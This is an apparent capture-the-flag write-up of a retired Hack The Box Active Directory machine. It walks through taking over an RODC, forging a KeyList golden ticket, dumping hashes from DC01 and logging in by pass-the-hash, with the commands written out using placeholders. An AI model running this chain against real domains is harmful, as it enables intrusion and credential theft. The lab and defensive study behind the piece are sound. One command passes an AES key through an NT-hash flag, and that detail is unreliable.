---
machine: Garfield
os: Windows
difficulty: Hard
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, rodc, krbtgt, golden-ticket, keylist, dcsync, pass-the-hash]
---

# Garfield — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A domain with **two controllers**: `DC01` and an **RODC**. The path goes through compromising the RODC (`RODC01`), impersonating Administrator there, dumping the `krbtgt_8245` key and using a **golden ticket with KeyList** to obtain a TGT that `DC01` accepts. From there, Administrator's hash and pass-the-hash.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
nxc smb <IP>
nxc ldap <IP> --kerberos
```

The usual DC services (53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389) and, on enumeration, two hosts in `garfield.htb`: `DC01` and `RODC01`.

```bash
nxc smb <IP> -u j.arbuckle -p '<password>' --shares --users --groups
nxc ldap <IP> -u j.arbuckle -p '<password>' --query "(objectClass=*)" "*" --bloodhound --collection All
```

Starting credentials from the brief: `j.arbuckle`. BloodHound flags the exploitable ACLs towards the RODC and its associated accounts.

## Access

1. **Enumerate the RODC**: who can administer it and which accounts fall in its scope (*msDS-RevealOnDemandGroup*, *Allowed RODC Password Replication Group*).

```bash
nxc ldap <IP> -u j.arbuckle -p '<password>' \
  --query "(objectClass=*)" "(msDS-RevealOnDemandGroup=*)"
```

2. **Take the RODC**: with the permissions found (write ACLs over the computer account or its administrators) you gain administrative control of `RODC01` and run code as SYSTEM there.

```bash
bloodyAD -u '<user>' -p '<password>' -d garfield.htb --host rodc01.garfield.htb add genericAll ...
impacket-psexec garfield.htb/'<user>'@rodc01.garfield.htb
```

3. **Impersonate Administrator on the RODC** and dump its secrets: `sekurlsa`/`lsadump` on the RODC itself yield the `krbtgt_8245` AES256 key and any cached credentials in scope.

## Escalation

The jump to `DC01` uses a **RODC golden ticket**, not a domain one:

```bash
# Golden ticket for the RODC krbtgt (krbtgt_8245)
ticketer.py -nthash <krbtgt_8245_aes256> -domain-sid <SID> \
  -domain garfield.htb -dc-ip <IP> -spn krbtgt_8245 \
  administrator
export KRB5CCNAME=administrator.ccache
```

An RODC does not sign TGTs for the domain, so the ticket needs the **KeyList** extension (MS-PAC `PAC_CREDENTIAL_INFO` carrying a key list) before `DC01` accepts it and reveals the account's password material. With a valid ticket:

```bash
secretsdump.py -k -no-pass garfield.htb/administrator@dc01.garfield.htb
# Administrator NTLM hash
```

```bash
evil-winrm -i dc01.garfield.htb -u administrator -H <hash>
```

## Pitfalls

- **Mixing up `krbtgt` accounts**: the RODC key is `krbtgt_8245`; the domain key is not obtainable from the RODC.
- Without the KeyList extension, `DC01` rejects the RODC ticket.
- Sync the clock (`faketime`) or Kerberos fails with `KRB_AP_ERR_SKEW`.
- Check `msDS-RevealOnDemandGroup` before assuming which accounts can be dumped.

## Lessons

- An RODC is a weaker target than the DC, and its own `krbtgt` allows forging KeyList tickets.
- Permissions over computer accounts and their administrators are effectively domain privileges.
- Mitigation: audit RODC ACLs, restrict the password replication group, and hunt anomalous TGTs via `4769`/`4768`.
